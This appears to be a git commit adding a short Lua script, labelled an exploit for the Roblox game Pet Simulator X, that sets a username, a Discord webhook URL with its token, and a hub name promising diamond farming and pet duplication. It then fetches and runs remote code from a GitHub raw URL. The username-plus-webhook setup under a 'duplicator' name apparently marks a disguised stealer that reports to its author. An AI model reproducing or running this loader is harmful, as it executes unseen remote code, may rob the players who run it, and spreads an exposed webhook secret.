6f92db1cead6e9f0d04ebb5f09d7af894d47323f
ZeroFuku <130269129+RaidenMeiSama@users.noreply.github.com>
2023-04-26 14:15:56 +0800

    Add files via upload
    Exploit for pet sim x

---
+++ Pet Simulator X.lua
@@ -0,0 +1,5 @@
+_G.Username = "NriNse414" 
+_G.HubName = "Auto farm diamond and pet duplicator"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1100661003538157618/Xy5xGTEyA-7kkJmQaWFesJnRczZ_MWwykrhjzTUParrJEHVtTkpj3myyNFZJDmbeRy-i"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
